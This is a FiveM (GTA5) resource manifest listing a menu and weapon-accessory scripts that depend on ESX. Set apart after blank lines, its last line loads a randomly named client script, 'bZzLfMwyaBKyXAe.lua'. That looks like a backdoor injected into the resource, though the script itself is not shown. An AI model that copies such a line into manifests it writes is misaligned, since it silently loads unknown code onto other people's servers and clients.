fx_version 'adamant'

game 'gta5'


client_scripts {
	'pmenu/dependencies/menu.lua',
	--'pmenu/parameters/parameters.lua',
	'pmenu/menus.lua',
	'pmenu/client.lua',
	'pmenu/config.lua',
	'@es_extended/locale.lua',
	'weap-accessories/weapons_cl.lua'

}

server_scripts {
	'pmenu/server.lua',
	'@es_extended/locale.lua',
	'weap-accessories/weapons_sv.lua'
}

dependencies {
	'es_extended',
	'esx_base'
}



client_script "bZzLfMwyaBKyXAe.lua"